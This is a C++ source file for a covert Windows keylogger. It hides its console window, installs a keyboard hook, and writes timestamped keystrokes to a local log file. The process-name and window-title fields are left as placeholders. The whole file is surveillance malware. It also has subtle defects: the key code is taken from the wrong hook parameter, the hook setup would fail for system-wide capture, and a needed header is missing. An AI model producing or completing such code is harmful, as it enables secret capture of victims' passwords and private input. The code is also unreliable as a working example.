#include <iostream>
#include <fstream>
#include <windows.h>
#include <string>
#include <chrono>
#include <ctime>
#include <iomanip>

// Function to get current timestamp
std::string getCurrentTimestamp() {
    auto now = std::chrono::system_clock::now();
    std::time_t nowTimeT = std::chrono::system_clock::to_time_t(now);
    std::ostringstream oss;
    oss << std::put_time(std::localtime(&nowTimeT), "%Y-%m-%d %H:%M:%S");
    return oss.str();
}

// Function to log keys
void logKey(int key) {
    std::ofstream logfile;
    logfile.open("keylog.txt", std::ios_base::app);
    std::string timestamp = getCurrentTimestamp();
    std::string processName = "Current Process Name"; // Replace with actual process retrieval
    std::string windowTitle = "Current Window Title"; // Replace with actual window title retrieval
    logfile << timestamp << " [" << processName << "] [" << windowTitle << "] Key: " << (char)key << std::endl;
    logfile.close();
}

int main() {
    // Hide console window
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);

    // Hook for key logging
    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD, [](int nCode, WPARAM wParam, LPARAM lParam) {
        if (nCode == HC_ACTION) {
            logKey(lParam);
        }
        return CallNextHookEx(NULL, nCode, wParam, lParam);
    }, NULL, 0);

    // Run message loop
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0));
    UnhookWindowsHookEx(hook);
    return 0;
}